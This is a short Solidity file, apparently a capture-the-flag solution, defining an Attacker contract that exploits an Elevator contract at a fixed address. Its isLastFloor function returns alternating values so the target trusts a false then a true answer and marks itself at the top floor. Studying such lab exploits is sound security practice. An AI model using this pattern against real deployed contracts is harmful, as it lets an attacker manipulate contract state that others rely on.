// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./elevator.sol";
import "hardhat/console.sol";

contract Attacker{
    Elevator elevatorContract; //Contractname contractvariable

    address elevatorAddress = 0x46c9090c18B02Df8bD1849EddF5a27A448a0c043; 

    bool public toggle = true; 

    // import a contract
    constructor() public {
        elevatorContract = Elevator(elevatorAddress);
    }
    function isLastFloor(uint) external returns (bool){

            if(!toggle){
                toggle = true;
                return toggle;
            }

        toggle = false;
        return toggle;
    }

    function callGoTo() public {
        elevatorContract.goTo(1);
    }

}
